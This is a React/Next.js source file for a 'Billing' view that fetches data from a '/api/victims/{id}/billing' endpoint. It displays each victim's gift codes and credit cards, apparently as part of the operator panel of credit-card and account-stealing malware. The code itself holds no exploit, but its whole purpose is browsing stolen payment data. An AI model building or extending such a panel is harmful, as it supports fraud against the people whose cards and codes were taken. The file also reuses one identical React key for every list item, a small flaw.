import type { ICreditCard, IGift } from '@/interfaces';
import { CreditCard, CreditCardSkeleton } from '@/components';
import { GiftCode, GiftCodeSkeleton } from '@/components';
import { useId } from 'react';
import { fetcher } from '@/lib';
import { useRouter } from 'next/router';
import useSWR from 'swr';

export const Billing = () => {
  const router = useRouter();
  const { data, error } = useSWR(`/api/victims/${router.query.id}/billing`, fetcher);
  const giftcodes = data ? data?.giftcodes : null;
  const creditcards = data ? data?.creditcards : null;

  const id = useId();
  return (
    <>
      <div className="py-3 px-5 grid grid-cols-1 sm:grid-cols-3 md:grid-cols-3 base:grid-cols-3 gap-[1rem] lg:!grid-cols-3 2xl:!grid-cols-3 !relative !overflow-hidden">
        {!giftcodes || (!giftcodes.length && !error) ? (
          <>
            {Array.from({ length: 3 }).map(() => (
              <GiftCodeSkeleton key={id} />
            ))}
          </>
        ) : (
          giftcodes.map((data: IGift) => <GiftCode {...data} key={id} />)
        )}
      </div>

      <div className="mt-3 py-3 px-5 grid grid-cols-1 sm:grid-cols-3 md:grid-cols-3 base:grid-cols-3 gap-3 lg:!grid-cols-3 2xl:!grid-cols-3 !relative !overflow-hidden">
        {!creditcards || (!creditcards.length && !error) ? (
          <>
            {Array.from({ length: 6 }).map(() => (
              <CreditCardSkeleton key={id} />
            ))}
          </>
        ) : (
          creditcards.map((data: ICreditCard) => <CreditCard {...data} key={id} />)
        )}
      </div>
    </>
  );
};
